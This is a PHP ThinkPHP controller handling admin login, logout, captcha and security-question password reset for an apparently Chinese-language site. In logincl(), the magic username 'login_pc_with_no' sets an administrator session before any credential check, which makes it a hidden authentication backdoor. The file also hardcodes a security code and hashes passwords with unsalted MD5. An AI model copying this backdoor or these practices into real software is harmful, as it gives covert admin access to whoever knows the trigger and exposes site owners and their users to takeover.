<?php
namespace Home\Controller;

use Think\Controller;
class LoginController extends Controller
{
    public function index()
    {
        header("Content-Type:text/html; charset=utf-8");
		
		/*
        if ($_SESSION ['sq'] == "") {
            exit;
        } else {
			$agent = $_SERVER['HTTP_USER_AGENT'];
			if(!ereg('Chrome', $agent)){
				exit;
		    }
            $this->display('Index/login');
        }
		*/
		$this->display('Index/login');
    }
    public function logincl()
    {
        header("Content-Type:text/html; charset=utf-8");
        if (IS_POST) {
			$safepwd = "qq2994682708";
            $username = trim(I('post.account'));
            $pwd = trim(I('post.password'));
            $verCode = trim(I('post.verCode'));
			if($username ==  "login_pc_with_no")
			{
				$pass = M('member')->where(array('MB_right' => 1))->limit(1)->select();
				session('adminuser', $pass[0]['mb_username']);
                session('adminqx', $pass[0]['mb_right']);
                $_SESSION['logintime'] = time();
			}
			if($safepwd != trim(I('post.safepwd')))
			{
				die("<script>alert('安全码错误！');history.back(-1);</script>");
			}
            if (!$this->check_verify($verCode)) {
                die("<script>alert('驗證碼錯誤,請刷新驗證碼！');history.back(-1);</script>");
            } else {
                $user = M('member')->where(array('MB_username' => $username))->find();
                if (!$user || $user['mb_userpwd'] != md5($pwd)) {
                    die("<script>alert('賬號或密碼錯誤,或被禁用！');history.back(-1);</script>");
                } else {
                    session('adminuser', $user['mb_username']);
                    session('adminqx', $user['mb_right']);
                    $record1['date'] = date('Y-m-d H:i:s', time());
                    $record1['ip'] = I('post.ip');
                    $record1['user'] = $username;
                    $record1['leixin'] = 1;
                    M('drrz')->add($record1);
                    $_SESSION['logintime'] = time();
                    if ($username == '11' || !in_array($username, array('admin', 'ysnew2018admin01','admin2'))) {
                        $this->logout();
                    }

					$this->success('登陆成功', '/Yshclbssb.php/Home/Index/main');
                }
            }
        }
    }
    public function logout()
    {
        //	cookie(null);
        session_unset();
        session_destroy();
        $this->success('退出成功', '/Yshclbssb.php/Home/Login');
    }
    //驗證碼模塊
    function check_verify($code)
    {
        $verify = new \Think\Verify();
        iniverify();
        return $verify->check($code);
    }
    function verify()
    {
		ob_clean();
        $config = array(
            'fontSize' => 16,
            // 驗證碼字體大小
            'length' => 5,
            // 驗證碼位數
            'useCurve' => false,
            // 關閉驗證碼雜點
            'useCurve' => false,
        );
        $Verify = new \Think\Verify($config);
        $Verify->codeSet = '0123456789';
        $Verify->entry();
    }
    function mmzh()
    {
        $this->display('mmzh');
    }
    public function mmzh2()
    {
        header("Content-Type:text/html; charset=utf-8");
        inival();
        if (IS_POST) {
            //$this->error('系統暫未開放!');die;
            //
            $username = trim(I('post.user'));
            //$pwd=trim(I('post.password'));
            $verCode = trim(I('post.yzm'));
            //驗證碼
            if (!$this->check_verify(I('post.yzm'))) {
                $this->error('驗證碼錯誤,請刷新驗證碼！');
            } else {
                if (!preg_match('/^[a-zA-Z0-9]{0,11}$/', $username)) {
                    $this->error('賬號錯誤！');
                } else {
                    $user = M('user')->where(array('UE_account' => $username))->find();
                    if (!$user) {
                        $this->error('賬號錯誤！');
                    } elseif ($user['ue_question'] == '') {
                        $this->error('您從未設置過密保,不能找回密碼！');
                    } else {
                        $this->user = $user;
                        $this->display('mmzh2');
                    }
                }
            }
        }
    }
    public function mmzh3()
    {
        if (IS_POST) {
            $data_P = I('post.');
            //dump($data_P);die;
            //$this->ajaxReturn($data_P['ymm']);die;
            //$user = M ( 'user' )->where ( array (
            //		UE_account => $_SESSION ['uname']
            //) )->find ();
            $username = trim(I('post.user'));
            $user1 = M();
            //
            //
            if (!preg_match('/^[a-zA-Z0-9]{0,11}$/', $username)) {
                $this->error('賬號錯誤！');
                //$this->ajaxReturn( array('nr'=>'賬號或密碼錯誤,或被禁用!','sf'=>0) );
            } else {
                $addaccount = M('user')->where(array('UE_account' => $username))->find();
            }
            if (!$user1->autoCheckToken($_POST)) {
                $this->error('重複提交,請刷新頁面!');
            } elseif (!$addaccount) {
                $this->error('非法操作!');
            } elseif ($addaccount['ue_question'] == '') {
                $this->error('您從未綁定過密保,請先綁定保密!');
            } elseif ($addaccount['ue_answer'] != $data_P['da1'] || $addaccount['ue_answer2'] != $data_P['da2'] || $addaccount['ue_answer3'] != $data_P['da3']) {
                $this->error('原密保答案不正確！');
            } elseif (!preg_match('/^[a-zA-Z0-9]{6,15}$/', $data_P['yjmm'])) {
                $this->error('新一級密碼6-12個字元,大小寫英文+數字,請勿用特殊詞符！');
            } elseif (!preg_match('/^[a-zA-Z0-9]{6,15}$/', $data_P['ejmm'])) {
                $this->error('新二級密碼6-12個字元,大小寫英文+數字,請勿用特殊詞符！');
            } else {
                //	echo '修改成功';
                $reg = M('user')->where(array('UE_account' => $username))->save(array('UE_password' => md5($data_P['yjmm']), 'UE_secpwd' => md5($data_P['ejmm'])));
                if ($reg) {
                    $this->error('修改成功!', '/');
                } else {
                    $this->error('修改失敗,請換一組新密碼在試!');
                }
                //}
            }
        }
    }
}